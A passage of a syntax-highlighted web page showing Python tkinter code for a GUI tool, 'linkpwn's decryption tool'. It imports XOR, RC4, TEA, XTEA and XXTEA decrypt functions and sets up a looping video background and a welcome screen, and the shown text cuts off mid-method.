class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox, ttk</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageTk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入外部解密模块</span></span><br><span class="line"><span class="keyword">from</span> xor1 <span class="keyword">import</span> decrypt <span class="keyword">as</span> xor_decrypt</span><br><span class="line"><span class="keyword">from</span> rc4 <span class="keyword">import</span> decrypt <span class="keyword">as</span> rc4_decrypt</span><br><span class="line"><span class="keyword">from</span> tea <span class="keyword">import</span> decrypt1 <span class="keyword">as</span> tea_decrypt</span><br><span class="line"><span class="keyword">from</span> xtea <span class="keyword">import</span> decrypt1 <span class="keyword">as</span> xtea_decrypt</span><br><span class="line"><span class="keyword">from</span> xxtea <span class="keyword">import</span> decrypt <span class="keyword">as</span> xxtea_decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UIBuilder</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;UI组件构建工具类，用于创建统一风格的UI元素&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_title</span>(<span class="params">parent, text, font_size=<span class="number">24</span>, emoji=<span class="string">&quot;&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建带表情符号的标题标签&quot;&quot;&quot;</span></span><br><span class="line">        title = tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=<span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span> <span class="subst">&#123;emoji&#125;</span>&quot;</span>,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            bg=bg,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> title</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_button</span>(<span class="params">parent, text, command, bg=<span class="string">&quot;#4ECDC4&quot;</span>, font_size=<span class="number">12</span>, emoji=<span class="string">&quot;&quot;</span>, bg_hover=<span class="string">&quot;#3A9DA2&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建带悬停效果的按钮&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">on_enter</span>(<span class="params">e</span>):</span><br><span class="line">            btn.config(bg=bg_hover)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">on_leave</span>(<span class="params">e</span>):</span><br><span class="line">            btn.config(bg=bg)</span><br><span class="line"></span><br><span class="line">        btn = tk.Button(</span><br><span class="line">            parent,</span><br><span class="line">            text=<span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span> <span class="subst">&#123;emoji&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text,</span><br><span class="line">            command=command,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            bg=bg,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">            bd=<span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">        btn.bind(<span class="string">&quot;&lt;Enter&gt;&quot;</span>, on_enter)</span><br><span class="line">        btn.bind(<span class="string">&quot;&lt;Leave&gt;&quot;</span>, on_leave)</span><br><span class="line">        <span class="keyword">return</span> btn</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_label</span>(<span class="params">parent, text, font_size=<span class="number">12</span>, fg=<span class="string">&quot;white&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建统一风格的标签&quot;&quot;&quot;</span></span><br><span class="line">        label = tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=text,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size),</span><br><span class="line">            fg=fg,</span><br><span class="line">            bg=bg</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> label</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_algorithm_info</span>(<span class="params">parent, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成算法说明文本&quot;&quot;&quot;</span></span><br><span class="line">        info_texts = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot; XOR通过将密文与密钥进行异或操作来还原明文。\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;特点：速度快，适用于简单加密场景，但安全性较低。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;RC4是一种流加密算法，通过密钥生成伪随机字节流，与密文异或得到明文。\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;    特点：效率高，常用于网络数据加密，但存在安全漏洞需注意。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;TEA是一种分组加密算法，使用64位分组和128位密钥。\n&quot;</span></span><br><span class="line">                   <span class="string">&quot; 特点：结构简单，安全性较高，适用于资源受限环境。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;XTEA是TEA的扩展版本，改进了加密函数和密钥调度算法。\n&quot;</span></span><br><span class="line">                    <span class="string">&quot;  特点：比TEA更抗密码分析，保持了算法简洁性。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;XXTEA是另一种TEA扩展，进一步优化了加密强度和性能。\n&quot;</span></span><br><span class="line">                     <span class="string">&quot;    特点：安全性高，适用于需要可靠加密的场景。&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        info = tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=info_texts.get(algorithm, <span class="string">&quot;暂无算法说明&quot;</span>),</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">10</span>),</span><br><span class="line">            fg=<span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            bg=<span class="string">&quot;#1a1a2e&quot;</span>,</span><br><span class="line">            justify=tk.LEFT,</span><br><span class="line">            wraplength=<span class="number">480</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VideoBackground</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;视频背景播放器（增强版，强制使用视频背景）&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, parent, video_path, width=<span class="number">800</span>, height=<span class="number">600</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.parent = parent</span><br><span class="line">        <span class="variable language_">self</span>.width = width</span><br><span class="line">        <span class="variable language_">self</span>.height = height</span><br><span class="line">        <span class="variable language_">self</span>.video_path = os.path.abspath(video_path)</span><br><span class="line">        <span class="variable language_">self</span>.cap = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.video_label = tk.Label(parent, bg=<span class="string">&quot;black&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.video_label.place(x=<span class="number">0</span>, y=<span class="number">0</span>, relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.stop_flag = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>.thread = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.running = <span class="literal">True</span></span><br><span class="line">        <span class="variable language_">self</span>.error_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 尝试多次加载视频，避免单次失败</span></span><br><span class="line">        <span class="variable language_">self</span>._init_video(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_init_video</span>(<span class="params">self, force=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化视频，支持强制重试&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.video_path):</span><br><span class="line">            <span class="variable language_">self</span>._show_error(<span class="string">f&quot;⚠️ 视频文件不存在：<span class="subst">&#123;self.video_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>._create_error_overlay(<span class="string">&quot;视频文件缺失&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.cap = cv2.VideoCapture(<span class="variable language_">self</span>.video_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.cap.isOpened():</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;无法打开视频文件：<span class="subst">&#123;self.video_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.fps = <span class="variable language_">self</span>.cap.get(cv2.CAP_PROP_FPS) <span class="keyword">or</span> <span class="number">30</span></span><br><span class="line">            <span class="variable language_">self</span>.start_playback()</span><br><span class="line">            <span class="variable language_">self</span>.error_count = <span class="number">0</span>  <span class="comment"># 重置错误计数</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.error_count += <span class="number">1</span></span><br><span class="line">            <span class="variable language_">self</span>._show_error(<span class="string">f&quot;⚠️ 视频打开错误（尝试 <span class="subst">&#123;self.error_count&#125;</span>/5）：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 创建错误提示覆盖层</span></span><br><span class="line">            <span class="variable language_">self</span>._create_error_overlay(<span class="string">f&quot;视频加载失败 <span class="subst">&#123;self.error_count&#125;</span>/5\n正在重试...&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 尝试重新加载</span></span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.error_count &lt;= <span class="number">5</span> <span class="keyword">and</span> force:</span><br><span class="line">                <span class="variable language_">self</span>.parent.after(<span class="number">3000</span>, <span class="variable language_">self</span>._init_video)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>._show_error(<span class="string">&quot;⚠️ 视频加载失败，使用默认背景&quot;</span>, critical=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_show_error</span>(<span class="params">self, msg, critical=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示错误信息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> critical:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;视频初始化失败&quot;</span>, msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_create_error_overlay</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建错误提示覆盖层（半透明）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 清除现有覆盖层</span></span><br><span class="line">        <span class="keyword">for</span> widget <span class="keyword">in</span> <span class="variable language_">self</span>.parent.winfo_children():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(widget, tk.Canvas) <span class="keyword">and</span> widget._name.startswith(<span class="string">&quot;error_overlay&quot;</span>):</span><br><span class="line">                widget.destroy()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建新覆盖层（半透明黑色背景）</span></span><br><span class="line">        overlay = tk.Canvas(</span><br><span class="line">            <span class="variable language_">self</span>.parent,</span><br><span class="line">            width=<span class="variable language_">self</span>.width,</span><br><span class="line">            height=<span class="variable language_">self</span>.height,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            bd=<span class="number">0</span>,</span><br><span class="line">            highlightthickness=<span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">        overlay.place(x=<span class="number">0</span>, y=<span class="number">0</span>)</span><br><span class="line">        overlay._name = <span class="string">&quot;error_overlay&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 半透明背景（30%透明度效果）</span></span><br><span class="line">        overlay.create_rectangle(</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="variable language_">self</span>.width, <span class="variable language_">self</span>.height,</span><br><span class="line">            fill=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            stipple=<span class="string">&quot;gray50&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 错误文本</span></span><br><span class="line">        overlay.create_text(</span><br><span class="line">            <span class="variable language_">self</span>.width / <span class="number">2</span>, <span class="variable language_">self</span>.height / <span class="number">2</span>,</span><br><span class="line">            text=text,</span><br><span class="line">            fill=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">14</span>, <span class="string">&quot;bold&quot;</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_playback</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;启动视频播放&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.cap <span class="keyword">and</span> <span class="keyword">not</span> <span class="variable language_">self</span>.thread:</span><br><span class="line">            <span class="variable language_">self</span>.stop_flag = <span class="literal">False</span></span><br><span class="line">            <span class="variable language_">self</span>.thread = threading.Thread(</span><br><span class="line">                target=<span class="variable language_">self</span>._update_video,</span><br><span class="line">                daemon=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">            <span class="variable language_">self</span>.thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop_playback</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;停止视频播放并释放资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.stop_flag = <span class="literal">True</span></span><br><span class="line">        <span class="variable language_">self</span>.running = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.thread <span class="keyword">and</span> <span class="variable language_">self</span>.thread.is_alive():</span><br><span class="line">            <span class="variable language_">self</span>.thread.join(timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.cap:</span><br><span class="line">            <span class="variable language_">self</span>.cap.release()</span><br><span class="line">            <span class="variable language_">self</span>.cap = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;🎥 视频播放已停止&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_video</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;视频帧更新循环&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="variable language_">self</span>.running <span class="keyword">and</span> <span class="keyword">not</span> <span class="variable language_">self</span>.stop_flag:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.cap <span class="keyword">or</span> <span class="keyword">not</span> <span class="variable language_">self</span>.cap.isOpened():</span><br><span class="line">                    <span class="comment"># 尝试重新打开视频</span></span><br><span class="line">                    <span class="variable language_">self</span>._init_video()</span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                ret, frame = <span class="variable language_">self</span>.cap.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">                    <span class="comment"># 视频结束，从头开始</span></span><br><span class="line">                    <span class="variable language_">self</span>.cap.<span class="built_in">set</span>(cv2.CAP_PROP_POS_FRAMES, <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 处理视频帧</span></span><br><span class="line">                frame = cv2.resize(frame, (<span class="variable language_">self</span>.width, <span class="variable language_">self</span>.height))</span><br><span class="line">                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)</span><br><span class="line">                img = Image.fromarray(frame)</span><br><span class="line">                imgtk = ImageTk.PhotoImage(image=img)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 更新显示</span></span><br><span class="line">                <span class="variable language_">self</span>.video_label.config(image=imgtk)</span><br><span class="line">                <span class="variable language_">self</span>.video_label.image = imgtk</span><br><span class="line">                time.sleep(<span class="number">1.0</span> / <span class="variable language_">self</span>.fps)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> DEBUG:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;⚠️ 视频处理错误：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)  <span class="comment"># 错误后等待，避免CPU占用过高</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DecryptApp</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, root</span>):</span><br><span class="line">        <span class="variable language_">self</span>.root = root</span><br><span class="line">        <span class="variable language_">self</span>.root.title(<span class="string">&quot;✨ linkpwn的解密工具 ✨&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.root.geometry(<span class="string">&quot;800x600&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.root.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置窗口图标（示例图标路径，可替换为实际图标）</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            root.iconbitmap(<span class="string">&quot;linkpwn.ico&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;⚠️ 图标加载失败，使用默认图标&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 强制使用视频背景</span></span><br><span class="line">        video_path = <span class="string">&quot;富士山的星空.mp4&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.video_bg = VideoBackground(root, video_path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建欢迎界面（移除半透明遮罩）</span></span><br><span class="line">        <span class="variable language_">self</span>.create_welcome_screen()</span><br><span class="line">        <span class="variable language_">self</span>.create_status_bar()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 注册窗口关闭事件</span></span><br><span class="line">        <span class="variable language_">self</span>.root.protocol(<span class="string">&quot;WM_DELETE_WINDOW&quot;</span>, <span class="variable language_">self</span>.on_close)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_welcome_screen</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建欢迎界面（仅保留视频背景上的UI元素）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 欢迎标题（直接放置在视频背景上）</span></span><br><span class="line">        title = UIBuilder.create_title(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            <span class="string">&quot;欢迎使用linkpwn的解密工具&quot;</span>,</span><br><span class="line">            font_size=<span class="number">36</span>,</span><br><span class="line">            emoji=<span class="string">&quot;✨&quot;</span>,</span><br><span class="line">            bg=<span class="literal">None</span>  <span class="comment"># 透明背景</span></span><br><span class="line">        )</span><br><span class="line">        title.configure(fg=<span class="string">&quot;#5dade2&quot;</span>)  <span class="comment"># 仅设置标题字体为浅蓝色</span></span><br><span class="line">        title.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.3</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 进入按钮（直接放置在视频背景上）</span></span><br><span class="line">        enter_btn = UIBuilder.create_button(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            <span class="string">&quot;进入解密工具&quot;</span>,</span><br><span class="line">            <span class="variable language_">self</span>.open_algorithm_selector,</span><br><span class="line">            bg=<span class="string">&quot;#FF6B6B&quot;</span>,</span><br><span class="line">            font_size=<span class="number">18</span>,</span><br><span class="line">            emoji=<span class="string">&quot;🔓&quot;</span>,</span><br><span class="line">            bg_hover=<span class="string">&quot;#FF4D4F&quot;</span></span><br><span class="line">        )</span><br><span class="line">        enter_btn.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.5</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 版权信息（直接放置在视频背景上）</span></span><br><span class="line">        copyright_text = UIBuilder.create_label(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            <span class="string">&quot;© 2025 linkpwn. 保留所有权利.&quot;</span>,</span><br><span class="line">            font_size=<span class="number">10</span>,</span><br><span class="line">            fg=<span class="string">&quot;#999999&quot;</span>,</span><br><span class="line">            bg=<span class="literal">None</span>  <span class="comment"># 透明背景</span></span><br><span class="line">        )</span><br><span class="line">        copyright_text.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.95</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_algorithm_selector</span>(<span class="params">self</span>):</span><br><span class="line">        <span 